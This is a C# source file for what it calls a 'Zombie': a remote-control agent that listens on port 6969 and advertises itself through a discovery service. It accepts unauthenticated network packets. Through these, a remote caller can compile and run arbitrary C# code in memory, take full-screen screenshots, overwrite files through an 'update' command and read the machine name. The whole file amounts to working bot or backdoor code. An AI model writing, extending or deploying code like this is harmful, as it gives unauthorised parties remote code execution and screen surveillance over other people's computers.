using FirebridgeShared.Models;
using FirebridgeShared.Networking;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FireBridgeZombie
{
    class Zombie
    {
        public const int Revision = 1;
        Server s;
        DiscoveryServer DiscoveryServer;
        public Zombie()
        {
            s = new Server();
            DiscoveryServer = new DiscoveryServer();
            s.ClientConnected += S_ClientConnected;
            s.ConnectionDisconnected += S_ConnectionDisconnected;
        }

        private void S_ConnectionDisconnected(object sender, EventArgs e)
        {
            var e2 = (ServerConnectionEventArgs)e;
        }

        private void Connection_MessageRecieved(object sender, EventArgs e)
        {
            var packet = ((MessageEventArgs)e).Packet;
            var connection = (Connection)sender;
            switch (packet.Id)
            {
                case 0: //Message/Command
                    break;
                case 1: //Run Code
                    var code = (MiniProgramModel)packet.Data;
                    CSharpCodeProvider provider = new CSharpCodeProvider();
                    CompilerParameters parameters = new CompilerParameters();
                    parameters.GenerateInMemory = true;
                    parameters.ReferencedAssemblies.AddRange(code.References.ToArray());
                    CompilerResults results = provider.CompileAssemblyFromSource(parameters, code.Code);
                    results.Errors.Cast<CompilerError>().ToList().ForEach(error => Console.WriteLine(error.ErrorText));

                    var cls = results.CompiledAssembly.GetType(code.EntryPoint);
                    var method = cls.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);  
                    method.Invoke(null, new[] { sender });

                    break;
                case 2: //Restart
                    s.Stop();
                    DiscoveryServer.Stop();
                    Environment.ExitCode = (int)packet.Data;
                    Application.Exit();
                    break;
                case 3: //Screenshot
                    var screenshotRequestModel = (ScreenshotRequestModel)packet.Data;
                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }

                        var brush = new SolidBrush(Color.Black);

                        var bmp = new Bitmap(screenshotRequestModel.Width, screenshotRequestModel.Height);
                        var graph = Graphics.FromImage(bmp);

                        graph.InterpolationMode = InterpolationMode.High;
                        graph.CompositingQuality = CompositingQuality.HighQuality;
                        graph.SmoothingMode = SmoothingMode.AntiAlias;

                        graph.FillRectangle(brush, new RectangleF(0, 0, screenshotRequestModel.Width, screenshotRequestModel.Height));
                        graph.DrawImage(bitmap, 0, 0, screenshotRequestModel.Width, screenshotRequestModel.Height);

                        connection.SendPacket(new Packet() { Id = 3, Data = bmp });
                    }
                    break;
                case 4: //Update
                    var data = (UpdateModel)packet.Data;
                    for (int i = 0; i < data.Names.Count; i++)
                        File.WriteAllBytes(data.Names[i] + ".new", data.Data[i]);

                    s.Stop();
                    DiscoveryServer.Stop();
                    Environment.ExitCode = 69;
                    Application.Exit();
                    s.Stop();
                    break;
                case 5: //Identification
                    connection.SendPacket(new Packet() { Id = 5, Data = Environment.MachineName });
                    break;
                case 6: //ZombieRevision
                    connection.SendPacket(new Packet() { Id = 6, Data = Revision });
                    break;
                default:
                    Console.WriteLine("Unknown Packet of " + packet.Id);
                    connection.SendPacket(new Packet() { Id = 0, Data = "Unknown Packet of " + packet.Id });
                    break;
            }
        }

        private void S_ClientConnected(object sender, EventArgs e)
        {
            var e2 = (ServerConnectionEventArgs)e;
            e2.Connection.MessageRecieved += Connection_MessageRecieved;
        }

        internal void Start()
        {
            DiscoveryServer.Run();
            s.Start(new IPEndPoint(IPAddress.Any, 6969));
            DiscoveryServer.Stop();
        }
    }
}
